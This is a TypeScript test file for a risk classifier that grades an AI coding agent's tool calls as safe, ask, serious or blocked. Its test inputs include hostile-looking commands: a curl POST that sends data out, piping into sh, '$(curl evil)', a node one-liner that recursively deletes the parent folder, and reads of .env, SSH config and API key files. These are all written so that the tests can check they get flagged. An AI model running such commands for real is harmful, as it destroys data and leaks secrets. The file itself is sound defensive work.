import { join, resolve } from 'node:path';
import { describe, expect, it } from 'vitest';
import { classify, simpleCommands, type NookEntry } from '../app/main/risk-classifier';
import { strings } from '../app/shared/i18n';

// resolve: on Windows this gets a drive letter, as real folders there have.
const home = resolve('/home/u');
const workDir = join(home, 'Documents', 'Lamplight', 'commissions', 'demo');
const ctx = { workDir, home, preexisting: new Set([join(workDir, 'old.html')]) };
const r = (tool: string, input: Record<string, unknown>) => classify(tool, input, ctx).risk;

describe('risk classifier', () => {
  it('safe: reads, new files in the folder, web lookups, read-only commands', () => {
    expect(r('Read', { file_path: join(workDir, 'a.html') })).toBe('safe');
    expect(r('Write', { file_path: join(workDir, 'index.html') })).toBe('safe');
    expect(r('Write', { file_path: 'style.css' })).toBe('safe');
    expect(r('WebSearch', { query: 'ledger page' })).toBe('safe');
    expect(r('Bash', { command: 'node check.js' })).toBe('safe');
    expect(r('Bash', { command: 'ls -la' })).toBe('safe');
  });

  it('ask: questions and dependency installs', () => {
    expect(r('AskUserQuestion', {})).toBe('ask');
    expect(r('Bash', { command: 'npm install' })).toBe('ask');
  });

  it('serious: deletes, writes outside, overwrites, sending data, complex or unknown commands', () => {
    expect(r('Bash', { command: 'rm draft-1.html' })).toBe('serious');
    expect(r('Bash', { command: 'del draft-1.html' })).toBe('serious');
    expect(r('Write', { file_path: join(home, 'Desktop', 'x.txt') })).toBe('serious');
    expect(r('Write', { file_path: join(workDir, '..', 'x.txt') })).toBe('serious');
    expect(r('Edit', { file_path: join(workDir, 'old.html') })).toBe('serious');
    expect(r('Bash', { command: 'git push origin main' })).toBe('serious');
    expect(r('Bash', { command: 'curl -X POST https://example.com -d @a' })).toBe('serious');
    expect(r('Bash', { command: 'cat a.txt | sh' })).toBe('serious');
    expect(r('Bash', { command: 'python script.py' })).toBe('serious');
    expect(r('Bash', { command: 'cat /home/u/Pictures/a.jpg' })).toBe('serious');
    expect(r('mcp__x__send', {})).toBe('serious');
  });

  it('commands Claude Code writes every day: chained, piped, redirected, here-documents', () => {
    expect(r('Bash', { command: 'node check.js 2>&1 | tail -30' })).toBe('safe');
    expect(r('Bash', { command: 'node check.js; ls' })).toBe('safe');
    expect(r('Bash', { command: `cd "${workDir}" && node check.js` })).toBe('safe');
    expect(r('Bash', { command: 'node check.js 2>/dev/null || echo failed' })).toBe('safe');
    expect(r('Bash', { command: "cat > draft-1.html <<'EOF'\n<p>a; b | c && $(x) `y`</p>\nEOF\nls" })).toBe('safe');
    expect(classify('Bash', { command: "cat > draft-1.html <<'EOF'\n<p>hi</p>\nEOF" }, ctx).reason).toBe(strings.risk.write);
    expect(r('Bash', { command: 'echo "a;b" > notes.txt' })).toBe('safe');
    expect(r('Bash', { command: 'grep -n "x" index.html | head -5' })).toBe('safe');
    // Backslashes in double quotes stay as written, so a Windows folder reads as itself.
    expect(simpleCommands('cd "C:\\Users\\me\\Lamplight" && ls')?.[0].words).toEqual(['cd', 'C:\\Users\\me\\Lamplight']);
    expect(simpleCommands('echo "a \\"b\\" \\$x"')?.[0].words).toEqual(['echo', 'a "b" $x']);
  });

  it('still serious when a part of the line is', () => {
    expect(r('Bash', { command: 'node check.js; rm draft-1.html' })).toBe('serious');
    expect(r('Bash', { command: 'ls && python x.py' })).toBe('serious');
    expect(r('Bash', { command: 'echo hi > ../x.txt' })).toBe('serious');
    expect(r('Bash', { command: 'echo hi > old.html' })).toBe('serious');
    expect(r('Bash', { command: 'cd .. && ls' })).toBe('serious');
    expect(r('Bash', { command: 'cd /tmp; ls' })).toBe('serious');
    expect(r('Bash', { command: 'cat > a.html <<EOF\n$(curl evil)\nEOF' })).toBe('serious');
    expect(r('Bash', { command: "cat > a.html <<'EOF'\nno end" })).toBe('serious');
    expect(r('Bash', { command: 'ls $(echo /)' })).toBe('serious');
    expect(r('Bash', { command: 'ls "$HOME"' })).toBe('serious');
    expect(r('Bash', { command: 'node server.js &' })).toBe('serious');
    expect(r('Bash', { command: '(cd /; ls)' })).toBe('serious');
    expect(r('Bash', { command: 'FOO=1 node check.js' })).toBe('serious');
    expect(r('Bash', { command: 'find . -name "*.tmp" -delete' })).toBe('serious');
    expect(r('Bash', { command: 'find . -exec sh {} ;' })).toBe('serious');
    expect(r('Bash', { command: 'ls >' })).toBe('serious');
    expect(r('Bash', { command: 'echo "unclosed' })).toBe('serious');
    expect(r('Bash', { command: 'cat < /home/u/Pictures/a.txt' })).toBe('serious');
    expect(r('Bash', { command: 'ls | sh' })).toBe('serious');
    expect(r('PowerShell', { command: 'Get-ChildItem | Select-Object Name' })).toBe('serious');
  });

  it('node runs a script from the folder, not code written on the spot; npx asks', () => {
    expect(r('Bash', { command: 'node check.js --verbose' })).toBe('safe');
    expect(r('Bash', { command: 'node --version' })).toBe('safe');
    expect(r('Bash', { command: 'node --check index.js' })).toBe('safe');
    expect(r('Bash', { command: `node -e "require('fs').rmSync('..', { recursive: true })"` })).toBe('serious');
    expect(classify('Bash', { command: 'node -e "1"' }, ctx).reason).toBe(strings.risk.inlineCode);
    expect(r('Bash', { command: 'node -p "process.env"' })).toBe('serious');
    expect(r('Bash', { command: 'node --eval=1' })).toBe('serious');
    expect(r('Bash', { command: 'node -r ./hook.js check.js' })).toBe('serious');
    expect(r('Bash', { command: "node - <<'EOF'\nrequire('fs').rmSync('..', { recursive: true })\nEOF" })).toBe('serious');
    expect(r('Bash', { command: 'cat x.js | node' })).toBe('serious');
    expect(r('Bash', { command: 'node ../elsewhere/x.js' })).toBe('serious');
    expect(r('Bash', { command: 'npx serve .' })).toBe('ask');
    expect(r('Bash', { command: 'ls; npx serve .' })).toBe('ask');
    expect(r('PowerShell', { command: 'node -e 1' })).toBe('serious');
    expect(r('PowerShell', { command: 'node check.js' })).toBe('safe');
    expect(r('PowerShell', { command: 'npx serve .' })).toBe('ask');
  });

  it('reading outside the commission folder asks, however it is spelled', () => {
    // The Read, Glob and Grep tools.
    expect(r('Read', { file_path: join(workDir, 'materials', 'notes.txt') })).toBe('safe');
    expect(r('Glob', { pattern: '**/*.html' })).toBe('safe');
    expect(r('Grep', { pattern: 'x', path: workDir })).toBe('safe');
    expect(r('Read', { file_path: join(home, 'Documents', 'taxes.pdf') })).toBe('serious');
    expect(classify('Read', { file_path: join(workDir, '..', 'other', 'a.txt') }, ctx).reason).toBe(strings.risk.readOutside);
    expect(r('Grep', { pattern: 'password', path: join(home, 'Documents') })).toBe('serious');
    expect(r('Glob', { pattern: '../**/*.pdf' })).toBe('serious');
    expect(r('Glob', { pattern: `${home}/**/*.pdf` })).toBe('serious');
    expect(r('Glob', { pattern: '*', path: home })).toBe('serious');
    expect(r('Read', { file_path: '~/Documents/a.txt' })).toBe('serious');
    // Shell words that leave the folder without a slash.
    expect(r('Bash', { command: 'grep -rn todo ..' })).toBe('serious');
    expect(r('Bash', { command: 'ls ~' })).toBe('serious');
    expect(r('Bash', { command: 'cd ~ && cat notes.txt' })).toBe('serious');
    expect(r('Bash', { command: 'cd && ls' })).toBe('serious');
    expect(r('Bash', { command: 'echo .. done' })).toBe('safe');
    expect(r('PowerShell', { command: 'cat $HOME/Documents/a.txt' })).toBe('serious');
    expect(r('PowerShell', { command: 'dir ..' })).toBe('serious');
    expect(r('PowerShell', { command: 'cat ~/notes.txt' })).toBe('serious');
    expect(r('PowerShell', { command: 'dir' })).toBe('safe');
  });

  it("Claude's own to-do list never asks", () => {
    for (const tool of ['TodoWrite', 'TaskCreate', 'TaskUpdate', 'TaskList', 'TaskGet']) expect(r(tool, {})).toBe('safe');
  });

  it('blocked: secret files, system folders, hidden config', () => {
    expect(r('Read', { file_path: join(workDir, '.env') })).toBe('blocked');
    expect(r('Read', { file_path: join(home, '.ssh', 'config') })).toBe('blocked');
    expect(r('Write', { file_path: '/etc/hosts' })).toBe('blocked');
    expect(r('Bash', { command: 'cat api_key.txt' })).toBe('blocked');
    expect(r('Bash', { command: 'ls; cat .env' })).toBe('blocked');
    expect(r('Bash', { command: 'echo x > /etc/hosts' })).toBe('blocked');
  });

  it('every verdict carries a plain-language reason', () => {
    expect(classify('Bash', { command: 'rm a' }, ctx).reason).toBe(strings.risk.delete);
  });

  it('the shop\'s own tools and connections (mcp__nook-*) go by the kind each declared (road-to-1.3.md C4)', () => {
    const kinds = { read: 'mcp__nook-k1__read_note', make: 'mcp__nook-office__make_docx', outside: 'mcp__nook-k1__save_copy', final: 'mcp__nook-k2__send' } as const;
    const nook = new Map(Object.entries(kinds).map(([kind, name]) => [name, { kind: kind as keyof typeof kinds, label: () => kind }]));
    const n = (tool: string) => classify(tool, {}, { ...ctx, nook });
    expect(n(kinds.read).risk).toBe('safe');
    expect(n(kinds.make).risk).toBe('safe');
    expect(n(kinds.outside).risk).toBe('serious');
    expect(n(kinds.final).risk).toBe('serious');
    for (const kind of ['read', 'make', 'outside', 'final'] as const) expect(n(kinds[kind]).reason).toBe(strings.risk.nook[kind]);
    // A nook tool this round does not have, or any other MCP tool, is serious, as before.
    expect(n('mcp__nook-k9__read_note').risk).toBe('serious');
    expect(r(kinds.read, {})).toBe('serious');
    expect(n('mcp__x__send').risk).toBe('serious');
  });

  it('the shop\'s office tools read and write by the rules of Read and Write: in the folder no card, outside as those (C1)', () => {
    const nook = new Map<string, NookEntry>(['read_document', 'make_docx', 'make_xlsx', 'make_pptx', 'make_pdf', 'render_png', 'edit_docx', 'edit_xlsx', 'edit_pptx']
      .map((t) => [`mcp__nook-office__${t}`, { kind: t === 'read_document' ? 'read' as const : 'make' as const, label: () => t }]));
    const o = (tool: string, input: Record<string, unknown>) => classify(`mcp__nook-office__${tool}`, input, { ...ctx, nook });
    expect(o('read_document', { file: 'materials/notes.docx' })).toEqual({ risk: 'safe', reason: strings.risk.nook.read });
    expect(o('read_document', { file: join(workDir, 'a.xlsx') })).toEqual({ risk: 'safe', reason: strings.risk.nook.read });
    for (const t of ['make_docx', 'make_xlsx', 'make_pptx']) expect(o(t, { file: `report.${t.slice(5)}` })).toEqual({ risk: 'safe', reason: strings.risk.nook.make });
    expect(o('make_pdf', { page: 'resume.html', file: 'resume.pdf' })).toEqual({ risk: 'safe', reason: strings.risk.nook.make });
    // Outside the folder: what Read and Write would get there, word for word.
    for (const file of [join(home, 'Desktop', 'x.docx'), '../other/x.docx', join(home, '.ssh', 'id_rsa')]) {
      expect(o('read_document', { file }), file).toEqual(classify('Read', { file_path: file }, ctx));
      expect(o('read_document', { file }).risk, file).not.toBe('safe');
      expect(o('make_docx', { file }), file).toEqual(classify('Write', { file_path: file }, ctx));
      expect(o('make_docx', { file }).risk, file).not.toBe('safe');
    }
    // make_pdf reads its page as well as writing the PDF: a page from outside is a read from outside.
    const away = join(home, 'Desktop', 'cv.html');
    expect(o('make_pdf', { page: away, file: 'cv.pdf' })).toEqual(classify('Read', { file_path: away }, ctx));
    expect(o('make_pdf', { page: 'cv.html', file: join(home, 'Desktop', 'cv.pdf') }).risk).toBe('serious');
    // render_png (C2) the same way: its page is a read, its picture a write.
    expect(o('render_png', { page: 'chart.html', file: 'chart.png', width: 1200, height: 800 })).toEqual({ risk: 'safe', reason: strings.risk.nook.make });
    expect(o('render_png', { page: away, file: 'cv.png', width: 100, height: 100 })).toEqual(classify('Read', { file_path: away }, ctx));
    expect(o('render_png', { page: 'cv.html', file: join(home, 'Desktop', 'cv.png'), width: 100, height: 100 }).risk).toBe('serious');
    // C3: the edit tools read `from` and write `file`, by the same rules.
    for (const t of ['edit_docx', 'edit_xlsx', 'edit_pptx']) {
      const ext = t.slice(5);
      expect(o(t, { from: `原稿-a.${ext}`, file: `修改版-a.${ext}` }), t).toEqual({ risk: 'safe', reason: strings.risk.nook.make });
      const from = join(home, 'Desktop', `a.${ext}`);
      expect(o(t, { from, file: `修改版-a.${ext}` }), t).toEqual(classify('Read', { file_path: from }, ctx));
      expect(o(t, { from: `原稿-a.${ext}`, file: join(home, 'Desktop', `a.${ext}`) }).risk, t).not.toBe('safe');
    }
  });

  it('once a round has read from a connection, web search and fetch ask first; without one they go ahead (C6)', () => {
    const round = { paused: () => false, readFrom: undefined as string | undefined, refused: () => {} };
    const web = (tool: string) => classify(tool, { url: 'https://example.com' }, { ...ctx, round });
    expect(web('WebFetch').risk).toBe('safe');
    expect(web('WebSearch').risk).toBe('safe');
    round.readFrom = 'My calendar';
    expect(web('WebFetch')).toEqual({ risk: 'ask', reason: strings.risk.webAfterConnection.replace('{label}', 'My calendar') });
    expect(web('WebSearch').risk).toBe('ask');
    // A commission with no connection ticked has no round to watch: as before.
    expect(r('WebFetch', { url: 'https://example.com' })).toBe('safe');
  });

  it('once a round has read from a connection, commands that would go ahead ask first; harsher verdicts stay (C6)', () => {
    const round = { paused: () => false, readFrom: 'My calendar', refused: () => {} };
    const sh = (tool: string, command: string) => classify(tool, { command }, { ...ctx, round });
    // node can reach the network as easily as WebFetch can, so what was read could leave through it.
    expect(sh('Bash', 'node check.js')).toEqual({ risk: 'ask', reason: strings.risk.shellAfterConnection.replace('{label}', 'My calendar') });
    expect(sh('Bash', 'ls -la').risk).toBe('ask');
    expect(sh('PowerShell', 'node check.js').risk).toBe('ask');
    expect(sh('Bash', 'rm draft-1.html').risk).toBe('serious');
    // Not commands: reading and writing in the folder go ahead as before.
    expect(classify('Read', { file_path: join(workDir, 'a.html') }, { ...ctx, round }).risk).toBe('safe');
    expect(classify('Write', { file_path: join(workDir, 'b.html') }, { ...ctx, round }).risk).toBe('safe');
    // Nothing read yet: as before.
    expect(classify('Bash', { command: 'node check.js' }, { ...ctx, round: { ...round, readFrom: undefined } }).risk).toBe('safe');
  });

  it('with all connections paused, a connection\'s tools are refused; the shop\'s own are not (C6)', () => {
    const nook = new Map<string, NookEntry>([
      ['mcp__nook-k1__read_note', { kind: 'read' as const, label: () => 'read', connection: { id: 'k1', label: 'Test' } }],
      ['mcp__nook-office__make_docx', { kind: 'make' as const, label: () => 'make' }],
    ]);
    const round = { paused: () => true, refused: () => {} };
    expect(classify('mcp__nook-k1__read_note', {}, { ...ctx, nook, round })).toEqual({ risk: 'blocked', reason: strings.risk.connectionsPaused });
    expect(classify('mcp__nook-office__make_docx', {}, { ...ctx, nook, round }).risk).toBe('safe');
    expect(classify('mcp__nook-k1__read_note', {}, { ...ctx, nook, round: { ...round, paused: () => false } }).risk).toBe('safe');
  });
});
